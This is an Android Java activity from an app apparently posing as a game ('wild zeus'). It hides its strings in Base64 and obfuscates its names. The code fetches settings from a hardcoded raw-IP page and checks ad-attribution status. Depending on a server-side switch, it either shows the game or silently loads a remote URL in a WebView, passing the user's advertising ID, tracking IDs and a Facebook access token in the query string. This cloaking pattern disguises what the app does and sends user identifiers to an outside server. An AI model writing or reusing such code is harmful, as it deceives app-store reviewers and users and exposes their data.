package net.wild.zeuus;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebView;
import android.widget.Button;
import android.widget.ProgressBar;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.onesignal.OneSignal;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.util.Map;

public class WZ extends AppCompatActivity {

    public static String jsajas;
    public static String bhsa;
    public static String iusah;
    public static String ndfhs;
    public static String bvhsa = "-";
    public static String bvhahw;
    public static String nhshw;

    @Override
    protected void onStart() {
        super.onStart();

      new CountDownTimer(15000,1000){

          @Override
          public void onTick(long l) {
              if (!bhvaj.equals("-")){
                  OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE);
                  OneSignal.initWithContext(getApplicationContext());
                  OneSignal.setAppId(nhbvsa);

                  new Thread(new Runnable() {
                      @Override
                      public void run() {
                          try {

                              bvhahw = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                          } catch (Exception e) {

                          }
                      }
                  }).start();

                  ndfhs = AppsFlyerLib.getInstance().getAppsFlyerUID(getApplicationContext());

                  AppsFlyerLib.getInstance().init(bhvaj, new AppsFlyerConversionListener() {
                      @Override
                      public void onConversionDataSuccess(Map<String, Object> map) {

                          bvhsa = map.get(ProfileActivity.decodWZ("YWZfc3RhdHVz")).toString();

                          if (bvhsa.equals(ProfileActivity.decodWZ("Tm9uLW9yZ2FuaWM="))) {

                              try {
                                  jsajas = map.get(ProfileActivity.decodWZ("Y2FtcGFpZ24=")).toString();
                              } catch (Exception e) {

                              }

                              try {

                                  bhsa = map.get(ProfileActivity.decodWZ("bWVkaWFfc291cmNl")).toString();
                              } catch (Exception e) {

                              }

                              try {

                                  iusah = map.get(ProfileActivity.decodWZ("YWZfY2hhbm5lbA==")).toString();
                              } catch (Exception e) {

                              }


                              nhshw = MainActivity.parserWZ(jsajas, WZ.this);
                          }


                      }

                      @Override
                      public void onConversionDataFail(String s) {

                      }

                      @Override
                      public void onAppOpenAttribution(Map<String, String> map) {

                      }

                      @Override
                      public void onAttributionFailure(String s) {

                      }
                  }, WZ.this);
                  AppsFlyerLib.getInstance().start(WZ.this);
                  cancel();
              }else {

              }


          }

          @Override
          public void onFinish() {
              if (bhvaj.equals("-")){
                  onTick(5000);
              }

          }
      }.start();



    }

    public static ValueCallback<Uri> ubsgw;
    public static Uri nahq = null;
    public static ValueCallback<Uri[]> bvgag;
    public static String qqqw;
    public static final int mjchs = 1;

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != mjchs || bvgag == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] ubhaa = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (qqqw != null) {
                    ubhaa = new Uri[]{Uri.parse(qqqw)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    ubhaa = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        bvgag.onReceiveValue(ubhaa);
        bvgag = null;
        if (ubsgw == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? nahq : data.getData();
            }
        } catch (Exception e) {
        }
        ubsgw.onReceiveValue(result);
        ubsgw = null;
    }

    @Override
    public void onBackPressed() {
        if (webOfWZ.isFocused() && webOfWZ.canGoBack()) {
            webOfWZ.goBack();
        }
    }

    protected boolean idhs() {
        String njda = Context.CONNECTIVITY_SERVICE;
        ConnectivityManager cm = (ConnectivityManager) getSystemService(njda);
        if (cm.getActiveNetworkInfo() == null) {
            return false;
        } else {
            return true;
        }
    }

    public static Button buttonStart, buttonClose;
    public static ProgressBar bar;
    public static WebView webOfWZ;
    public static String asaj;
    public static String bgcsg;
    public static String nbhds;
    public static String bhvvs;
    public static String bhvaj = "-";
    public static String nhbvsa;
    private String nhbsg;
    public static String nhcbah = null;
    public static String nvhsh = "-";

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.wz);
        buttonStart = findViewById(R.id.buttonStart);
        buttonClose = findViewById(R.id.buttonClose);
        buttonStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                startActivity(new Intent(getApplicationContext(),MainActivity.class));
                finishAffinity();
            }
        });
        buttonClose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                finishAffinity();
            }
        });
        bar = findViewById(R.id.bar);
        WebWZ.wz = this;
        webOfWZ = findViewById(R.id.webOfWZ);
        nhbsg = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(ProfileActivity.decodWZ("c2F2ZWRVcmw="), ProfileActivity.decodWZ("bnVsbA=="));

        if (idhs()) {

            if (!nhbsg.equals(ProfileActivity.decodWZ("bnVsbA=="))) {

                webOfWZ.setVisibility(View.VISIBLE);
                webOfWZ.loadUrl(nhbsg);
            } else {

                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            Document doc = Jsoup.connect(ProfileActivity.decodWZ("aHR0cDovLzg4Ljg1LjY3LjE3MC93aWxkemV1cy5odG1s")).get();
                            asaj = doc.select(ProfileActivity.decodWZ("aDE=")).text();
                            bgcsg = doc.select(ProfileActivity.decodWZ("aDI=")).text();
                            nbhds = doc.select(ProfileActivity.decodWZ("aDM=")).text();
                            bhvvs = doc.select(ProfileActivity.decodWZ("aDQ=")).text();
                            bhvaj = doc.select(ProfileActivity.decodWZ("aDU=")).text();
                            nhbvsa = doc.select(ProfileActivity.decodWZ("aDY=")).text();
                            Log.d("weq", asaj);
                            Log.d("weq", bgcsg);
                            Log.d("weq", nbhds);
                            Log.d("weq", bhvvs);
                            Log.d("weq", bhvaj);
                            Log.d("weq", nhbvsa);

                            runOnUiThread(new Runnable() {
                                @Override
                                public void run() {

                                    ProfileActivity.fbSettingWz(bhvvs, WZ.this);
                                    NoIternetWz.deepWz(WZ.this);
                                    weWz();

                                }
                            });

                        } catch (Exception e) {
                            startActivity(new Intent(getApplicationContext(), NoIternetWz.class));
                            finishAffinity();
                        }
                    }
                }).start();

            }


        } else {


            Log.d("weq","1");
           hjk();
        }
    }

    private void hjk(){
        startActivity(new Intent(getApplicationContext(), NoIternetWz.class));
        finishAffinity();
    }

    private void weWz() {

        new CountDownTimer(20000, 1000) {

            @Override
            public void onTick(long l) {
                if (!bvhsa.equals("-") || !nvhsh.equals("-")) {

                    startWeWz();
                    cancel();
                }
            }

            @Override
            public void onFinish() {
                startWeWz();
            }
        }.start();

    }

    private void startWeWz(){

        if (bvhsa.equals(ProfileActivity.decodWZ("Tm9uLW9yZ2FuaWM="))) {
            String aaa = bgcsg + nhshw;
            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(ProfileActivity.decodWZ("c2F2ZWRVcmw="), aaa).apply();
            webOfWZ.setVisibility(View.VISIBLE);
            webOfWZ.loadUrl(aaa);
            Log.d("weq","App"+aaa);

        } else if (nhcbah != null) {
            String aaaa = bgcsg + nvhsh;

            getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(ProfileActivity.decodWZ("c2F2ZWRVcmw="), aaaa).apply();
            webOfWZ.setVisibility(View.VISIBLE);
            webOfWZ.loadUrl(aaaa);
            Log.d("weq","Dip"+aaaa);

        } else {
            if (asaj.equals("0")) {

                buttonStart.setVisibility(View.VISIBLE);
                buttonClose.setVisibility(View.VISIBLE);
                bar.setVisibility(View.INVISIBLE);
                Log.d("weq","game");

            } else {

                String aaaa = bgcsg + ProfileActivity.decodWZ("P21lZGlhX3NvdXJjZT1vcmdhbmlj") +
                        ProfileActivity.decodWZ("Jmdvb2dsZV9hZGlkPQ==") + bvhahw +
                        ProfileActivity.decodWZ("JmFmX3VzZXJpZD0=") + ndfhs +
                        ProfileActivity.decodWZ("JmRldl9rZXk9") + bhvaj +
                        ProfileActivity.decodWZ("JmJ1bmRsZT0=") + getPackageName() +
                        ProfileActivity.decodWZ("JmZiX2FwcF9pZD0=") + bhvvs +
                        ProfileActivity.decodWZ("JmZiX2F0PQ==") + nbhds;

                getSharedPreferences(getPackageName(), MODE_PRIVATE).edit().putString(ProfileActivity.decodWZ("c2F2ZWRVcmw="), aaaa).apply();
                webOfWZ.setVisibility(View.VISIBLE);
                webOfWZ.loadUrl(aaaa);
                Log.d("weq","Organic"+aaaa);
            }
        }
    }
}
